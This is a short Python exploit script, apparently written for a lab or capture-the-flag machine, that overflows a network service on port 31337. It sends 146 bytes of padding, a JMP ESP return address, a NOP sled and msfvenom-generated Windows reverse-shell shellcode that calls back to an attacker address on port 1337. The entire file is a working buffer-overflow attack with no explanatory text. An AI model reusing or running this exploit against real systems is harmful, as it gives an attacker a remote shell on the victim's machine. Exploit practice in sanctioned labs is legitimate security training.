#!/usr/bin/env python3

import socket, sys

host = "10.10.128.185"
port = 31337

offset = 146
overflow = "a"*offset
retn = "\xc3\x14\x04\x08" # 080414C3   ? FFE4           JMP ESP
padding = "\x90"*16

# msfvenom -p windows/shell_reverse_tcp LHOST=10.14.10.227 LPORT=1337 EXITFUNC=thread -b "\x00\x0a" -v payload -f py
payload =  ""
payload += "\xbd\x05\x25\xb3\x71\xdb\xcd\xd9\x74\x24\xf4\x5b"                                                                                   
payload += "\x29\xc9\xb1\x52\x83\xc3\x04\x31\x6b\x0e\x03\x6e"                                                                                   
payload += "\x2b\x51\x84\x8c\xdb\x17\x67\x6c\x1c\x78\xe1\x89"                                                                                   
payload += "\x2d\xb8\x95\xda\x1e\x08\xdd\x8e\x92\xe3\xb3\x3a"
payload += "\x20\x81\x1b\x4d\x81\x2c\x7a\x60\x12\x1c\xbe\xe3"
payload += "\x90\x5f\x93\xc3\xa9\xaf\xe6\x02\xed\xd2\x0b\x56"
payload += "\xa6\x99\xbe\x46\xc3\xd4\x02\xed\x9f\xf9\x02\x12"
payload += "\x57\xfb\x23\x85\xe3\xa2\xe3\x24\x27\xdf\xad\x3e"
payload += "\x24\xda\x64\xb5\x9e\x90\x76\x1f\xef\x59\xd4\x5e"
payload += "\xdf\xab\x24\xa7\xd8\x53\x53\xd1\x1a\xe9\x64\x26"
payload += "\x60\x35\xe0\xbc\xc2\xbe\x52\x18\xf2\x13\x04\xeb"
payload += "\xf8\xd8\x42\xb3\x1c\xde\x87\xc8\x19\x6b\x26\x1e"
payload += "\xa8\x2f\x0d\xba\xf0\xf4\x2c\x9b\x5c\x5a\x50\xfb"
payload += "\x3e\x03\xf4\x70\xd2\x50\x85\xdb\xbb\x95\xa4\xe3"
payload += "\x3b\xb2\xbf\x90\x09\x1d\x14\x3e\x22\xd6\xb2\xb9"
payload += "\x45\xcd\x03\x55\xb8\xee\x73\x7c\x7f\xba\x23\x16"
payload += "\x56\xc3\xaf\xe6\x57\x16\x7f\xb6\xf7\xc9\xc0\x66"
payload += "\xb8\xb9\xa8\x6c\x37\xe5\xc9\x8f\x9d\x8e\x60\x6a"
payload += "\x76\xbb\x7a\x7e\x65\xd3\x80\x7e\x6c\x1d\x0c\x98"
payload += "\x04\x4d\x58\x33\xb1\xf4\xc1\xcf\x20\xf8\xdf\xaa"
payload += "\x63\x72\xec\x4b\x2d\x73\x99\x5f\xda\x73\xd4\x3d"
payload += "\x4d\x8b\xc2\x29\x11\x1e\x89\xa9\x5c\x03\x06\xfe"
payload += "\x09\xf5\x5f\x6a\xa4\xac\xc9\x88\x35\x28\x31\x08"
payload += "\xe2\x89\xbc\x91\x67\xb5\x9a\x81\xb1\x36\xa7\xf5"
payload += "\x6d\x61\x71\xa3\xcb\xdb\x33\x1d\x82\xb0\x9d\xc9"
payload += "\x53\xfb\x1d\x8f\x5b\xd6\xeb\x6f\xed\x8f\xad\x90"
payload += "\xc2\x47\x3a\xe9\x3e\xf8\xc5\x20\xfb\x18\x24\xe0"
payload += "\xf6\xb0\xf1\x61\xbb\xdc\x01\x5c\xf8\xd8\x81\x54"
payload += "\x81\x1e\x99\x1d\x84\x5b\x1d\xce\xf4\xf4\xc8\xf0"
payload += "\xab\xf5\xd8"


# bad chars \x00\x0a

s_buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(bytes(s_buffer + "\r\n", 'latin-1'))
s.recv(1024)
print("Crashed :)")